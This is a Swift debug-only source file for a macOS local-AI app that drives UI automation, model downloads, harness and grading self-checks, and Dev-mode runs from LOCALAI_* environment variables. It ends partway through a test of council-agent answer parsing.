#if DEBUG
import AppKit
import SwiftUI
import WebKit

/// Debug-build-only automation used for UI verification without Screen Recording permission.
///   LOCALAI_SNAPSHOT_DIR=/path      write window snapshots (snap-N.png) every LOCALAI_SNAPSHOT_INTERVAL seconds
///   LOCALAI_AUTOPROMPT="text"       start a new chat and send this prompt after launch; " || " separates several;
///                                   LOCALAI_SIDE_BY_SIDE=1 asks the plain model and the harness each one
///   LOCALAI_VERDICT_CHECK=/path.txt check what code says about a plain reply and a harness reply
///   LOCALAI_V6_CHECK=/path.txt      check v6's routing, sentences and loop with a scripted model and canned pages
///   LOCALAI_ROUTER_CHECK=/path.txt  check where the one harness's router sends a task, with a scripted model
///   LOCALAI_ONE_CHECK=/path.txt     check the one harness on every route, with a scripted model, canned pages and the sandbox
///   LOCALAI_EDITION=lab|standard    which edition this run is; LOCALAI_EDITION_CHECK=/path.txt checks what each one offers,
///                                   runs and calls a version
///   LOCALAI_TRACE_CHECK=/path.txt   run every finished harness version, chat and Dev, against a scripted model and compare
///                                   each request, step and reply with checks/traces; LOCALAI_TRACE_RECORD=1 writes those files
///   LOCALAI_IFEVAL_CROSS=/in.json   run the ported IFEval checks on cases made by the reference logic, writing /in.json.out.txt;
///                                   LOCALAI_HELDOUT_CHECK=/path.txt checks the held-out loader and graders;
///                                   LOCALAI_HELDOUT_GRADE=/replies.json grades {"id": "reply"} made outside the app for
///                                   LOCALAI_HELDOUT_SET (practice-v1 unless given), writing /replies.json.graded.txt
///   LOCALAI_FIRSTRUN_CHECK=/path.txt check the first-run steps, starter models and download messages;
///                                   LOCALAI_PRETEND_NO_OLLAMA=1 and LOCALAI_OLLAMA_URL=http://127.0.0.1:port show those pages
///   LOCALAI_DEV_V2_CHECK=/path.txt  check Dev harness v2 with a scripted model and canned page reports;
///                                   LOCALAI_DEV_VERSION=v1|v2 picks the Dev harness for this run
///   LOCALAI_DEMO=1                  run the harness demo after launch; LOCALAI_SHARE_CARD=/path.png writes the
///                                   picture of the newest side by side reply once nothing is generating
///   LOCALAI_STOP_AFTER=3            press Stop this many seconds after the autoprompt starts
///   LOCALAI_SCROLL_TO=0.8           scroll the page to this fraction of its height after 2 s
///   LOCALAI_SHOW_MODEL_PICKER=1     open the model + quant picker after launch
///   LOCALAI_NO_ACTIVATE=1           don't bring the app to the front on launch
///   LOCALAI_DATA_DIR=/path          keep chats in this folder instead of the user's
///   LOCALAI_DESTINATION=tests|model|hardware|harness|publish|library|telemetry   open that page after launch;
///                                   in a page tour, "back" after "telemetry" returns to the page before it
///   LOCALAI_PUBLISH_ALL=1           write the file Publish makes, with every saved run
///   LOCALAI_DEV_CHECK=/path         check Dev mode's parsing, sandbox and agent with a scripted model
///   LOCALAI_DEV_SESSION_CHECK=/path  check the Dev workspace's controller, in a folder with an awkward name
///   LOCALAI_DEV_PROJECT=/path       open this folder in Dev mode; LOCALAI_DEV_OPEN=file shows a file,
///                                   LOCALAI_DEV_RUN=command runs one, LOCALAI_DEV_SEND=text asks the agent ("fix" fixes
///                                   the last run), and LOCALAI_DEV_STOP_AFTER=2 presses Stop that many seconds later
///   LOCALAI_DEV_SHOW_COMPARE=1      with LOCALAI_DEV_PROJECT, open the Compare view on the newest comparison;
///                                   LOCALAI_DEV_COMPARE_FILL=on,off,both gives a side the window, one step every 3 s;
///                                   LOCALAI_DEV_COMPARE_SHOT=8 takes the Compare screenshot that many seconds in;
///                                   LOCALAI_DEV_HARNESS=off turns the agent's harness off, and
///                                   LOCALAI_DEV_COMPARE=text builds that request with the harness off and on
///   LOCALAI_DEV_TASKS=/path.json    measure the agent on coding tasks; LOCALAI_DEV_OUT=/path gets the report, with
///                                   LOCALAI_DEV_MODES=harness,oneshot, LOCALAI_DEV_ONLY=id,id, LOCALAI_DEV_CONTEXT=8192,
///                                   LOCALAI_DEV_THINK=1 and LOCALAI_DEV_TRACE=/path for every prompt
///   LOCALAI_DEV_REGRADE=/path       play pages a measuring run left behind again (lines: label, folder, game|page,
///                                   split by tabs); LOCALAI_DEV_OUT=/path gets the verdicts
///   LOCALAI_HARNESS_SIZE=max        which Harness Test the Tests page uses
///   LOCALAI_PROGRESS_LOG=/path      write each step of a running Harness Test
///   LOCALAI_REMOVE=tag              remove this model after launch
///   LOCALAI_PULL=tag                download this model after launch; LOCALAI_PULL_LOG=/path gets its progress
///   LOCALAI_AUTOTEST=model|hardware|harness      run that test after launch
///   LOCALAI_PAGE_TOUR=tests,harness  move through these pages, writing frames of each move to LOCALAI_TOUR_DIR
///   LOCALAI_TEST_MODEL=tag          model the model test runs on (the chat's model stays as it is)
///   LOCALAI_SHOW_TEST_PICKER=1      open the model test's model picker after launch
///   LOCALAI_EXPAND_TESTS=id,id      open these questions in the model test dashboard
///   LOCALAI_DUMP_SUITE=/path.json   write the model test as JSON, to run it outside the app
///   LOCALAI_GRADE=/path.json        grade replies from {"id": "reply"}, writing /path.json.graded.json
///   LOCALAI_HARNESS_CHECK=/path.txt check the harness's allowlist, calculator, guard and web tools, writing a report
///   LOCALAI_WEB_VIA_CURL=1          make the harness's web requests with curl (see WebTools)
///   LOCALAI_CLOSE_MAIN=3            close the main window after this many seconds, like its red button
///   LOCALAI_CHATS=0|1               start with the chats closed or open
///   LOCALAI_CHAT_SEARCH=text        search the chats for this after launch
///   LOCALAI_HARNESS_SAMPLE=id,id    run these questions through the harness; LOCALAI_SAMPLE_OUT=/path gets the report
///   LOCALAI_CHAT_HARNESS=1          turn the harness on for chat
///   LOCALAI_HARNESS_VERSION=tools|pipeline|loop|thinking|council   the version chat, the sample and the Harness tab use;
///                                   chat and the Harness tab only follow it with LOCALAI_EDITION=lab
///   LOCALAI_SETTINGS_TAB=safety     open that section of the Settings page
///   LOCALAI_PRESS_UPDATE=3          press Update this many seconds after launch
///   LOCALAI_PICK_CHATS=all|2        start in the chats' Select mode with these chats ticked
///   LOCALAI_DELETE_PICKED=1         delete the ticked chats after 3 s
///   LOCALAI_WINDOW_SIZE=1380x2400   resize the main window after launch, to snapshot more of a page
///   LOCALAI_RENDER_DIR=/path        render both full dashboards (narrow and wide) after LOCALAI_RENDER_DELAY seconds
///   LOCALAI_BACKUP_CHECK=/path.txt  check the copy made of saved data before a new build touches it
///   LOCALAI_SEED_CHECK=/path.txt    check the copy Prometheus Lab makes of the public app's data on its first run
///   LOCALAI_WEB=allowed|off|ask     how the harness may use the web in this run, without saving it;
///                                   LOCALAI_WEB_ANSWER=once|always|no answers its question 2 s after it shows
///   LOCALAI_CONSENT_CHECK=/path.txt check the question the harness asks before a web lookup
@MainActor
enum DebugHooks {
    private static var lastCheck: Task<Void, Never>?

    /// Runs a check once the ones started before it have ended. Checks that put canned pages in place of the web
    /// share one switch for it, and the first to end would otherwise leave the others on the real web.
    private static func afterOtherChecks(_ check: @escaping @MainActor () async -> Void) {
        let before = lastCheck
        lastCheck = Task { @MainActor in
            await before?.value
            await check()
        }
    }

    static func install(chat: ChatController, ui: UIState, lab: TestLab, backends: BackendController,
                        monitor: SystemMonitor, settings: AppSettings, updater: AppUpdater, dev: DevSession) {
        let env = ProcessInfo.processInfo.environment
        if let size = HarnessTestSize(rawValue: env["LOCALAI_HARNESS_SIZE"] ?? "") { lab.chooseHarnessSize(size) }
        if let path = env["LOCALAI_PROGRESS_LOG"] {
            Task {
                var steps: [String] = []
                while !Task.isCancelled {
                    if let progress = lab.harnessProgress, steps.last != "\(progress.step) | \(progress.detail)" {
                        steps.append("\(progress.step) | \(progress.detail)")
                        try? steps.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
                    }
                    try? await Task.sleep(for: .milliseconds(250))
                }
            }
        }
        if let tag = env["LOCALAI_REMOVE"] {
            Task { await backends.delete(tag) }
        }
        if let tag = env["LOCALAI_PULL"], let path = env["LOCALAI_PULL_LOG"] {
            Task {
                try? await Task.sleep(for: .seconds(2))
                backends.pull(tag)
                var lines: [String] = []
                while let pull = backends.pulls[tag], pull.task != nil {
                    lines.append(String(format: "%.3f %@", pull.fraction, pull.status))
                    try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
                    try? await Task.sleep(for: .milliseconds(500))
                }
                lines.append(backends.pulls[tag]?.error ?? "done")
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if env["LOCALAI_PUBLISH_ALL"] != nil {
            let machine = ResultsPublisher.machine(chip: monitor.chipName, gpuCores: monitor.gpuCoreCount)
            _ = try? ResultsPublisher.write(PublishedResults(app: AppUpdater.commit, machine: machine,
                                                             modelRuns: lab.modelResults, hardwareRuns: lab.hardwareResults))
        }
        if let delay = Double(env["LOCALAI_PRESS_UPDATE"] ?? "") {
            Task {
                try? await Task.sleep(for: .seconds(delay))
                updater.update()
            }
        }
        if env["LOCALAI_CLOSE_MAIN"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(Double(env["LOCALAI_CLOSE_MAIN"] ?? "") ?? 3))
                let main = NSApp.windows.first { $0.identifier?.rawValue.hasPrefix("main") == true }
                print("closing:", main?.identifier?.rawValue ?? "no main window", "of", NSApp.windows.map { $0.identifier?.rawValue ?? "?" })
                main?.performClose(nil)
                main?.close()
            }
        }
        if let tab = SettingsTab(rawValue: env["LOCALAI_SETTINGS_TAB"] ?? "") { ui.settingsTab = tab }
        if let pick = env["LOCALAI_PICK_CHATS"] {
            let ids = chat.conversations.map(\.id)
            ui.destination = .chat
            ui.selectingChats = true
            ui.pickedChats = Set(pick == "all" ? ids : Array(ids.prefix(Int(pick) ?? 0)))
            if env["LOCALAI_DELETE_PICKED"] != nil {
                Task {
                    try? await Task.sleep(for: .seconds(3))
                    chat.delete(ui.pickedChats)
                    ui.pickedChats = []
                    ui.selectingChats = false
                }
            }
        }
        if env["LOCALAI_CHAT_HARNESS"] != nil { settings.harnessEnabled = true }
        if let size = env["LOCALAI_WINDOW_SIZE"]?.split(separator: "x").compactMap({ Double($0) }), size.count == 2 {
            Task {
                try? await Task.sleep(for: .seconds(1))
                if let window = NSApp.windows.first(where: { $0.identifier?.rawValue.hasPrefix("main") == true }) {
                    window.setFrame(NSRect(x: 40, y: 40, width: size[0], height: size[1]), display: true)
                }
            }
        }
        if let chats = env["LOCALAI_CHATS"] { settings.chatsOpen = chats != "0" }
        if let search = env["LOCALAI_CHAT_SEARCH"] { ui.chatSearch = search }
        func go(to page: String?) {
            switch page {
            case "model": settings.showLab = true; ui.openTests(.model)
            case "hardware": ui.openTests(.hardware)
            case "harness": settings.showLab = true; ui.openTests(.harness)
            case "publish": settings.showLab = true; ui.openTests(.publish)
            case "tests": ui.openTests(.overview)
            case "library": ui.destination = .library
            case "chat": ui.destination = .chat
            case "settings": ui.destination = .settings
            case "home": ui.destination = .home
            case "telemetry": ui.destination = .telemetry
            // Telemetry's own way back, to the page it was opened from.
            case "back": ui.toggleTelemetry()
            default: break
            }
        }
        go(to: env["LOCALAI_DESTINATION"])
        if let tour = env["LOCALAI_PAGE_TOUR"], let dir = env["LOCALAI_TOUR_DIR"] {
            Task {
                try? await Task.sleep(for: .seconds(3))
                for (index, page) in tour.split(separator: ",").enumerated() {
                    go(to: String(page))
                    // Frames are kept in memory and written afterwards, so saving them doesn't stall the move.
                    var frames: [NSBitmapImageRep] = []
                    for _ in 0..<8 {
                        try? await Task.sleep(for: .milliseconds(25))
                        if let frame = tourFrame() { frames.append(frame) }
                    }
                    for (number, frame) in frames.enumerated() {
                        try? frame.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: "\(dir)/tour-\(index)-\(number).png"))
                    }
                    try? await Task.sleep(for: .seconds(1))
                }
            }
        }
        if let dir = env["LOCALAI_RENDER_DIR"] {
            Task {
                try? await Task.sleep(for: .seconds(Double(env["LOCALAI_RENDER_DELAY"] ?? "") ?? 3))
                let pages: [(String, AnyView)] = [("model", AnyView(ModelTestDashboard(scrollable: false))),
                                                  ("model-leaderboard", AnyView(ModelTestDashboard(scrollable: false, detail: .leaderboard))),
                                                  ("hardware", AnyView(HardwareTestDashboard(scrollable: false))),
                                                  ("hardware-steps", AnyView(HardwareTestDashboard(scrollable: false, detail: .phases))),
                                                  ("harness", AnyView(HarnessTestDashboard(scrollable: false))),
                                                  ("harness-versions", AnyView(HarnessTestDashboard(scrollable: false, detail: .versions))),
                                                  ("harness-picker", AnyView(HarnessPopover {})),
                                                  ("harness-changes", AnyView(HarnessTestDashboard(scrollable: false, detail: .changes))),
                                                  ("harness-routes", AnyView(HarnessTestDashboard(scrollable: false, detail: .routes))),
                                                  ("harness-tools", AnyView(HarnessTestDashboard(scrollable: false, detail: .tools))),
                                                  ("harness-sites", AnyView(HarnessTestDashboard(scrollable: false, detail: .sites)))]
                for (name, page) in pages {
                    for width in [760.0, 1120.0] {
                        let content = page
                            .environment(settings).environment(backends).environment(chat)
                            .environment(monitor).environment(ui).environment(lab)
                            .frame(width: width)
                            .background(Color(white: 0.12))
                            .environment(\.colorScheme, .dark)
                        let renderer = ImageRenderer(content: content)
                        renderer.scale = 2
                        if let cg = renderer.cgImage,
                           let png = NSBitmapImageRep(cgImage: cg).representation(using: .png, properties: [:]) {
                            try? png.write(to: URL(fileURLWithPath: "\(dir)/\(name)-\(Int(width)).png"))
                        }
                    }
                }
            }
        }
        if env["LOCALAI_DEMO"] != nil {
            Task {
                for _ in 0..<160 where !chat.canCompare { try? await Task.sleep(for: .milliseconds(250)) }
                ui.destination = .chat
                chat.runDemo()
            }
        }
        if let path = env["LOCALAI_SHARE_CARD"] {
            Task {
                try? await Task.sleep(for: .seconds(6))
                while chat.isGenerating || chat.demoRunning { try? await Task.sleep(for: .milliseconds(300)) }
                let messages = chat.selected?.messages ?? []
                guard let reply = messages.last(where: { $0.plain != nil }), let plain = reply.plain,
                      let question = chat.question(for: reply.id) else { return }
                let verdict = CompareVerdict.judge(question: question, plain: plain.content, harness: reply.content,
                                                   result: reply.harnessResult, steps: reply.harnessSteps ?? [])
                let card = ShareCard.Content(question: question, plain: plain.content, harness: reply.content, verdict: verdict,
                                             model: reply.modelName.map { ModelCatalog.entry(matchingID: $0)?.displayName ?? $0 } ?? "",
                                             machine: monitor.chipName, date: reply.createdAt,
                                             plainSeconds: plain.metrics?.totalDuration, harnessSeconds: reply.harnessSeconds)
                try? ShareCard.png(card)?.write(to: URL(fileURLWithPath: path))
            }
        }
        if let path = env["LOCALAI_IFEVAL_CROSS"], let data = FileManager.default.contents(atPath: path) {
            struct Case: Decodable {
                let key: Int
                let id: String
                let kwargs: [String: HeldOut.Value]
                let response: String
                let expected: Bool
            }
            var lines: [String] = []
            if let cases = try? JSONDecoder().decode([Case].self, from: data) {
                var differ = 0
                for item in cases {
                    let got = IFEvalChecks.followed(HeldOut.Instruction(id: item.id, kwargs: item.kwargs), in: item.response)
                    if got != item.expected {
                        differ += 1
                        lines.append("DIFFERS \(item.key) \(item.id): the port says \(got), the reference \(item.expected)")
                    }
                }
                lines.insert("\(cases.count) cases, \(differ) where the port and the reference differ", at: 0)
            } else {
                lines.append("couldn't read the cases")
            }
            try? lines.joined(separator: "\n").write(toFile: path + ".out.txt", atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_HELDOUT_GRADE"], let data = FileManager.default.contents(atPath: path),
           let replies = try? JSONDecoder().decode([String: String].self, from: data) {
            Task {
                let lines = await HeldOutCheck.grade(replies, set: env["LOCALAI_HELDOUT_SET"] ?? HeldOut.practice)
                try? lines.joined(separator: "\n").write(toFile: path + ".graded.txt", atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_FIRSTRUN_CHECK"] {
            try? FirstRunCheck.run().joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_HELDOUT_CHECK"] {
            Task {
                let lines = await HeldOutCheck.run()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_DEV_V2_CHECK"] {
            Task {
                let lines = await DevChecksV2.run()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let version = DevHarnessVersion(rawValue: env["LOCALAI_DEV_VERSION"] ?? "") { dev.harnessVersion = version }
        if let path = env["LOCALAI_V6_CHECK"] {
            afterOtherChecks {
                let lines = await TestLab.evidenceCheck()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_ONE_CHECK"] {
            afterOtherChecks {
                let lines = await TestLab.oneHarnessCheck()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_ROUTER_CHECK"] {
            Task {
                let lines = await HarnessRouter.selfCheck()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_EDITION_CHECK"] {
            try? Edition.selfCheck().joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_TRACE_CHECK"] {
            afterOtherChecks {
                let lines = await HarnessTraces.run(record: env["LOCALAI_TRACE_RECORD"] != nil)
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let path = env["LOCALAI_VERDICT_CHECK"] {
            try? CompareVerdict.selfCheck().joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_CONSENT_CHECK"] {
            Task {
                let lines = await WebConsent.selfCheck()
                try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let reply = env["LOCALAI_WEB_ANSWER"] {
            Task {
                while !Task.isCancelled {
                    if WebConsent.shared.pending != nil {
                        try? await Task.sleep(for: .seconds(2))
                        WebConsent.shared.answer(reply == "once" ? .once : reply == "always" ? .always : .notNow)
                    }
                    try? await Task.sleep(for: .milliseconds(200))
                }
            }
        }
        if let path = env["LOCALAI_SEED_CHECK"] {
            try? ConversationStore.seedCheck().joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_BACKUP_CHECK"] {
            var lines = DataBackup.selfCheck()
            // Only ever in a folder made for the check, never in someone's real data.
            if env["LOCALAI_DATA_DIR"] != nil {
                let file = ConversationStore.directory.appendingPathComponent("Dev/comparisons.json")
                try? FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
                try? "not json".write(to: file, atomically: true, encoding: .utf8)
                let read = DevCompare.load()
                let names = (try? FileManager.default.contentsOfDirectory(atPath: file.deletingLastPathComponent().path)) ?? []
                let aside = names.contains { $0.hasPrefix("comparisons.unreadable-") }
                lines.append("\(read.isEmpty && aside ? "PASS" : "FAIL") an unreadable Dev file is set aside, not lost")
            }
            try? lines.joined(separator: "\n").write(toFile: path, atomically: true, encoding: .utf8)
        }
        if let path = env["LOCALAI_HARNESS_CHECK"] {
            Task {
                // The check makes real requests, and there's nobody to ask.
                WebConsent.shared.allowForChecks()
                let report = await harnessCheck()
                try? report.write(toFile: path, atomically: true, encoding: .utf8)
            }
        }
        if let folder = env["LOCALAI_DEV_PROJECT"] {
            dev.isOn = true
            ui.destination = .home
            dev.open(URL(fileURLWithPath: folder))
            if let file = env["LOCALAI_DEV_OPEN"] { dev.openFile(file) }
            if env["LOCALAI_DEV_SHOW_COMPARE"] != nil {
                // With no comparison saved yet, the Compare view opens on its empty page.
                if let first = dev.comparisons.first { dev.showComparison(first.id) } else { dev.showsCompare = true }
            }
            if let delay = Double(env["LOCALAI_DEV_COMPARE_SHOT"] ?? "") {
                Task {
                    try? await Task.sleep(for: .seconds(delay))
                    print("compare screenshot:", await dev.screenshotComparison()?.path ?? "none")
                }
            }
            if let steps = env["LOCALAI_DEV_COMPARE_FILL"]?.split(separator: ",") {
                Task {
                    for step in steps {
                        try? await Task.sleep(for: .seconds(3))
                        dev.compareFills = step == "on" ? true : step == "off" ? false : nil
                    }
                }
            }
            if env["LOCALAI_DEV_HARNESS"] == "off" { dev.harnessOn = false }
            if let request = env["LOCALAI_DEV_COMPARE"] {
                Task {
                    for _ in 0..<120 where !dev.canCompare { try? await Task.sleep(for: .milliseconds(250)) }
                    dev.compare(request)
                }
            }
            if let code = UInt16(env["LOCALAI_DEV_PRESS"] ?? "") {
                // A real key and click, through the Preview pane the way a person's would go.
                Task {
                    try? await Task.sleep(for: .seconds(5))
                    func find(_ view: NSView) -> WKWebView? {
                        (view as? WKWebView) ?? view.subviews.lazy.compactMap(find).first
                    }
                    guard let window = NSApp.windows.first(where: { $0.contentView.flatMap(find) != nil }), let web = window.contentView.flatMap(find) else { return }
                    let point = web.convert(NSPoint(x: web.bounds.midX, y: web.bounds.midY), to: nil)
                    for type in [NSEvent.EventType.keyDown, .keyUp] {
                        if let event = NSEvent.keyEvent(with: type, location: .zero, modifierFlags: [], timestamp: 0, windowNumber: window.windowNumber, context: nil,
                                                        characters: "a", charactersIgnoringModifiers: "a", isARepeat: false, keyCode: code) {
                            if type == .keyDown { web.keyDown(with: event) } else { web.keyUp(with: event) }
                        }
                    }
                    for type in [NSEvent.EventType.leftMouseDown, .leftMouseUp] {
                        if let event = NSEvent.mouseEvent(with: type, location: point, modifierFlags: [], timestamp: 0, windowNumber: window.windowNumber, context: nil,
                                                          eventNumber: 0, clickCount: 1, pressure: 1) {
                            if type == .leftMouseDown { web.mouseDown(with: event) } else { web.mouseUp(with: event) }
                        }
                    }
                }
            }
            if let command = env["LOCALAI_DEV_RUN"] {
                Task {
                    try? await Task.sleep(for: .seconds(2))
                    dev.runCommand(command)
                }
            }
            if let request = env["LOCALAI_DEV_SEND"] {
                Task {
                    for _ in 0..<80 where !dev.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                    try? await Task.sleep(for: .seconds(4))
                    if request == "fix", let run = dev.runs.last { dev.fix(run) } else { dev.send(request) }
                    if let stop = Double(env["LOCALAI_DEV_STOP_AFTER"] ?? "") {
                        try? await Task.sleep(for: .seconds(stop))
                        dev.stopAgent()
                    }
                }
            }
        }
        if let path = env["LOCALAI_DEV_SESSION_CHECK"] {
            Task { await DevChecks.session(dev, path: path) }
        }
        if let path = env["LOCALAI_DEV_CHECK"] {
            Task { await DevChecks.run(path: path) }
        }
        if let spec = env["LOCALAI_DEV_REGRADE"], let out = env["LOCALAI_DEV_OUT"] {
            Task { await DevChecks.regrade(spec: spec, out: out) }
        }
        if let spec = env["LOCALAI_DEV_TASKS"], let out = env["LOCALAI_DEV_OUT"] {
            Task {
                for _ in 0..<80 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                guard let model = lab.testModel(in: backends) else {
                    try? "no model".write(toFile: out, atomically: true, encoding: .utf8)
                    return
                }
                let details = await backends.capabilities(of: model)
                let think = env["LOCALAI_DEV_THINK"].map { $0 == "1" } ?? false
                let setup = DevSetup(model: model.id, backend: backends.backend, context: env["LOCALAI_DEV_CONTEXT"].flatMap(Int.init) ?? details.context,
                                     think: backends.kind.supportsThinkingControl && details.supportsThinking ? think : nil)
                let modes = (env["LOCALAI_DEV_MODES"] ?? "harness").split(separator: ",").map(String.init)
                await DevChecks.evaluate(spec: spec, out: out, setup: setup, modes: modes,
                                         only: Set((env["LOCALAI_DEV_ONLY"] ?? "").split(separator: ",").map(String.init)))
            }
        }
        lab.testModelID = env["LOCALAI_TEST_MODEL"]
        if let version = env["LOCALAI_HARNESS_VERSION"].flatMap(HarnessVersion.init(rawValue:)) {
            settings.harnessVersion = version
            lab.harnessChoice = version
        }
        if let sample = env["LOCALAI_HARNESS_SAMPLE"], let out = env["LOCALAI_SAMPLE_OUT"] {
            Task {
                for _ in 0..<40 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                lab.debugSample(ids: sample.split(separator: ",").map(String.init), backends: backends, settings: settings, path: out)
            }
        }
        lab.expandedQuestions = Set((env["LOCALAI_EXPAND_TESTS"] ?? "").split(separator: ",").map(String.init))
        let suite = ModelTestSuite.questions(contextLength: 8_192)
        if let path = env["LOCALAI_DUMP_SUITE"] {
            let dump = suite.map { ["id": $0.id, "level": $0.level.name, "points": "\($0.level.weight)", "prompt": $0.prompt, "expected": $0.expected] }
            if let data = try? JSONSerialization.data(withJSONObject: dump, options: [.prettyPrinted, .sortedKeys]) {
                try? data.write(to: URL(fileURLWithPath: path))
            }
        }
        if let path = env["LOCALAI_GRADE"], let data = FileManager.default.contents(atPath: path),
           let replies = (try? JSONSerialization.jsonObject(with: data)) as? [String: String] {
            let graded = suite.map { q -> [String: String] in
                let reply = replies[q.id] ?? ""
                return ["id": q.id, "points": "\(q.level.weight)", "passed": "\(q.grade(reply))", "expected": q.expected,
                        "final": ModelTestSuite.finalAnswer(reply)]
            }
            if let out = try? JSONSerialization.data(withJSONObject: graded, options: [.prettyPrinted, .sortedKeys]) {
                try? out.write(to: URL(fileURLWithPath: path + ".graded.json"))
            }
        }
        if env["LOCALAI_SHOW_TEST_PICKER"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(2.5))
                ui.showTestModelPicker = true
            }
        }
        if let test = env["LOCALAI_AUTOTEST"] {
            Task {
                for _ in 0..<40 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                try? await Task.sleep(for: .seconds(1))
                if test == "hardware" {
                    lab.runHardwareTest(monitor: monitor, backends: backends)
                } else if test == "harness" {
                    lab.runHarnessTest(backends: backends, settings: settings)
                } else {
                    lab.runModelTest(backends: backends, settings: settings)
                }
            }
        }
        if let prompt = env["LOCALAI_AUTOPROMPT"] {
            Task {
                for _ in 0..<160 where !chat.canSend { try? await Task.sleep(for: .milliseconds(250)) }
                chat.newConversation()
                if let stop = Double(env["LOCALAI_STOP_AFTER"] ?? "") {
                    Task {
                        try? await Task.sleep(for: .seconds(stop))
                        chat.stop()
                    }
                }
                for part in prompt.components(separatedBy: " || ") {
                    chat.send(part, sideBySide: env["LOCALAI_SIDE_BY_SIDE"] != nil)
                    while chat.isGenerating { try? await Task.sleep(for: .milliseconds(250)) }
                }
            }
        }
        if let fraction = Double(env["LOCALAI_SCROLL_TO"] ?? "") {
            Task {
                try? await Task.sleep(for: .seconds(2))
                func scrollViews(in view: NSView) -> [NSScrollView] {
                    (view as? NSScrollView).map { [$0] } ?? view.subviews.flatMap(scrollViews)
                }
                guard let content = NSApp.windows.first(where: { $0.identifier?.rawValue.hasPrefix("main") == true })?.contentView,
                      let page = scrollViews(in: content).max(by: { ($0.documentView?.frame.height ?? 0) < ($1.documentView?.frame.height ?? 0) }),
                      let height = page.documentView?.frame.height else { return }
                page.documentView?.scroll(NSPoint(x: 0, y: (height - page.contentView.bounds.height) * fraction))
            }
        }
        if env["LOCALAI_SHOW_MODEL_PICKER"] != nil {
            Task {
                try? await Task.sleep(for: .seconds(2.5))
                ui.showModelPicker = true
            }
        }
        if let dir = env["LOCALAI_SNAPSHOT_DIR"] {
            let interval = Double(env["LOCALAI_SNAPSHOT_INTERVAL"] ?? "") ?? 4
            let count = Int(env["LOCALAI_SNAPSHOT_COUNT"] ?? "") ?? 5
            Task {
                for i in 0..<count {
                    try? await Task.sleep(for: .seconds(interval))
                    snapshot(to: "\(dir)/snap-\(i).png")
                }
            }
        }
    }

    /// v5's parts that need no model: reading replies, telling who agrees, and what each agent gets to read.
    private static func councilCheck() -> [String] {
        var lines: [String] = []
        func expect(_ name: String, _ ok: Bool) { lines.append("\(ok ? "PASS" : "FAIL") \(name)") }
        let (solver, skeptic, explorer) = (CouncilAgent.all[0], CouncilAgent.all[1], CouncilAgent.all[2])
        expect("three agents, each with its own temperature", Set(CouncilAgent.all.map(\.temperature)).count == 3)

        let parsed = SharedNotes.parse("It is 6 times 7.\n**Answer:** <your answer>42.", label: "Answer")
        expect("reply parsed: \(parsed)", parsed.note == "It is 6 times 7." && parsed.answer == "42")
        expect("answer on the next line", SharedNotes.parse("Done.\nAnswer:\nBob", label: "Answer").answer == "Bob")
        expect("no answer line falls back to the last line", SharedNotes.parse("Hm.\nBob", label: "Answer").answer == "Bob")
        expect("a task's own label", SharedNotes.parse("Hm.\nResult: 7", label: "Result").answer == "7")
        let echoed = SharedNotes.parse("Why: it fits.\nAnswer: <your answer>\nAnswer: Cara\nAnswer: <your answer>", label: "Answer")
        expect("a copied form is ignored: \(echoed)", echoed.answer == "Cara" && echoed.note == "Why: it fits.")
        let blank = SharedNotes.parse("Why: <your reason, in one or two sentences>\nAnswer: <your answer>", label: "Answer")
        expect("an unfilled form says nothing: \(blank)", blank.note.isEmpty && blank.answer == nil)

        for (first, second) in [("$12.50", "12.5"), ("The Hittites", "hittites"), ("**Au**", "au"), ("1,081", "1081")] {
            expect("\(first) agrees with \(second)", SharedNotes.key(of: first) == SharedNotes.key(of: second))
        }
        expect("different answers differ", SharedNotes.key(of: "Bob") != SharedNotes.key(of: "Alice"))
        expect("long text can't be compared", SharedNotes.key(of: String(repeating: "word ", count: 30)) == nil)

        func entry(_ agent: CouncilAgent, _ answer: String?) -> SharedNotes.Entry { .init(agent: agent, note: "Note by \(agent.name).", answer: answer) }
        let all = SharedNotes.standing(of: [entry(solver, "42"), entry(skeptic, "42.0"), entry(explorer, "42")])
        expect("three of three", all.isUnanimous && all.summary == "All three agree on 42")
        let two = SharedNotes.standing(of: [entry(solver, "40"), entry(skeptic, "42"), entry(explorer, "42")])
        expect("two of three pick the writer", !two.isUnanimous && two.answer == "42" && two.backers == [skeptic, explorer])
        let split = SharedNotes.standing(of: [entry(solver, "1"), entry(skeptic, "2"), entry(explorer, "3")])
        expect("no majority", split.answer == nil && split.summary == nil && !split.isUnanimous)
        let long = String(repeating: "long ", count: 30)
        expect("long answers never agree", SharedNotes.standing(of: [entry(solver, long), entry(skeptic, long), entry(explorer, long)]).answer == nil)

        let first = SharedNotes.Entry(agent: solver, note: "", answer: "tungsten")
